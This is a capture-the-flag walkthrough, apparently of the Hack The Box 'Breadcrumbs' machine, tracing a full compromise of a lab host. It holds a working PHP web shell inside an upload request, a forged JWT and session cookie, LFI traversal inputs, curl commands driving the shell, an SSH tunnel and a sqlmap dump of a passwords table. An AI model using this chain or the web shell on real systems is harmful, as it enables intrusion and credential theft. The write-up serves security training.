Lets go straight in,

we have a PHP website, I use an extension called wappalyzer which quickly tells us what technology is the webpage using,

searching for the books and authors on the website, at this URL => http://10.10.10.228/php/books.php
we see some requests going on in the background, which we can relay to burp suite

<img width="461" alt="bookcontroller" src="https://user-images.githubusercontent.com/60816781/126033342-a2e2dc0b-a000-403c-90db-0187d6649a0b.png">

the actual request in the above screenshot is method=0, I have modified it to see what happens, and we have some information disclosure here by throwing us an error

<img width="639" alt="bookcontrollerresponse" src="https://user-images.githubusercontent.com/60816781/126033348-6748f3c6-3629-4322-a2f3-6853a7a6b492.png">

which shows us that it is using some kind of path based format to load files in the website which is LFI

now, the app says, key 'book' is not found, now, lets modify the request a bit and add a param called `&book=1` in the repeater tab and send it over,
we get a response that looks like this

<img width="604" alt="modifiedbookcontrollerresponse" src="https://user-images.githubusercontent.com/60816781/126033354-073c962b-beb3-4e6b-954d-ce56cb10e0a3.png">

we have an LFI now, which allows us to read any remote files that we want, given that the webserver process has access to read those files

for eg: to read fileController.php, we can do `../includes/fileController.php` in the `&book=` parameter in the above request

after reading some files on the server (not including them, as we have to read for yourselves), we realize that there might be some broken logic wrt the authentication process in this web application

1. it generates PHPSESSID based on a piece of php code, part of which I've copied into `session_token.php` here, looking at that file, we can generate some PHPSESSIDs for different users

![badsessiongeneration](https://user-images.githubusercontent.com/60816781/126033365-3ff0e169-5ac3-4d50-8472-744efa20cde1.jpeg)

2. it generates JWT token, whose algorithm is revealed in one of the files that we read, along with the secret used to do the JWT signing. `jwttt.php`

![badtokengeneration](https://user-images.githubusercontent.com/60816781/126033372-e6ba242c-1ba4-45ed-8370-ef6b834b1721.jpeg)

3. one of these files also hints us that Paul is the admin guy on the site, who might be having some extra rights.

based on the above two points, we can simply generate bunch of tokens and PHPSESSIDs and try them against the website cookies, I've written the script called generate_payloads.py which can be used to generate these tokens and load them into two separate files.

Now, we use ffuf against these two files, as FUZZ1 and FUZZ2, and against the URL, http://breadcrumbs.htb/portal/index.php, with an autocalibrate flag, and we have a bunch of hits.

Lets take the token for Paul and the PHPSESSID for Paul and load them into our browser, now we are logged in as Paul. Now since we successfully pretended to be Paul, its time to upload files by using the fileupload functionality on this site..

at first, I tried uploading a full reverse shell which has thrown errors, and after some hours I realized that there might be file size limit on the file uploads, so now, I've uploaded a simple `cmd.php` file into the server which we can use to get some remote code execution.

request to upload a cmd.php
```
POST /portal/includes/fileController.php HTTP/1.1
Host: 10.10.10.228
<SNIP>
Cookie: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU

------WebKitFormBoundaryO4V4ASQlrEc2jywc
Content-Disposition: form-data; name="file"; filename="cmd.php"
Content-Type: application/x-php

<?php $output = shell_exec($_GET['cmd']);echo "$output";?>

------WebKitFormBoundaryO4V4ASQlrEc2jywc
Content-Disposition: form-data; name="task"

cmd.php
------WebKitFormBoundaryO4V4ASQlrEc2jywc--
```

after this we can see a cmd.php in the uploads directory, portal/uploads,

I've got a little command to enumerate this a bit more easily,

`curl http://10.10.10.228/portal/uploads/cmd.php\?cmd\="type+..\\..\\..\\..\\..\\..\\..\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\pizzaDeliveryUserData\\juliette.json`

so using this request, we can a bit more conveniently enumerate the file system now, after some time we got the above file `juliette.json`, in which we find the ssh password for juliette

now, lets ssh as juliette,
`ssh juliette@10.10.10.228`

now, we have to do more enumeration.
Basically, when we go into the juliette desktop directory we see two files, which are user flag and one other `todo.html`

this says there might be some stored passwords in the sticky notes, now lets go into the

`C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState` (googling gives us this path)

to find some useful DB files, we need not use a DB application to see the stuff that is useful to us in this file,
if we do a `type plum.sqlite-wal`, we can see some data dump into the console, if we observe carefully, we have the password for development user

Lets login as development, `ssh development@10.10.10.228`

Now I was clueless for quite some time as the development user, but once we get into the c:\development directory, we can see a Linux binary here, which, if we just run a simple strings.exe on it, we can see a request that it is doing on a site,

<img width="506" alt="port1234request" src="https://user-images.githubusercontent.com/60816781/126033334-0fe15bd3-89fc-42c5-bfec-4c9a78a496a9.png">

If we had run an `netstat -an` once we got juliette or development to take a look at the local services, we would have seen there is a service running on port 1234

lets run an ssh tunnel now,

`ssh -L 80:127.0.0.1:1234 development@10.10.10.228`

<img width="750" alt="Screenshot 2021-07-17 at 15 35 00" src="https://user-images.githubusercontent.com/60816781/126033488-2541c0e9-619e-4b3f-9f26-ea69a3ab7292.png">

now, lets repeat the request that we have seen in the strings output on our local port 80 (since we forwarded 80 on our instance to 1234 on BREADCRUMBS)

we can see there is some AES KEY here,

<img width="871" alt="Screenshot 2021-07-17 at 15 38 05" src="https://user-images.githubusercontent.com/60816781/126033556-18e3a2b7-0daf-421c-9549-ba014c651a2d.png">

looks like its making a SQL query, and if we run sqlmap on this rightly so, we can see it has dumped us a small table that has an encrypted password, and the same AES key as above,

`sqlmap -u http://127.0.0.1/index.php?method=select&username=administrator&table=passwords -D bread -T passwords --dump`

![roothash](https://user-images.githubusercontent.com/60816781/126033627-21bc2a4b-d55d-4c21-a375-9b0a7e3cca00.jpeg)

now, I've cracked the above hash with the given AES key online, and we get the Administrator password which we can use with SSH.
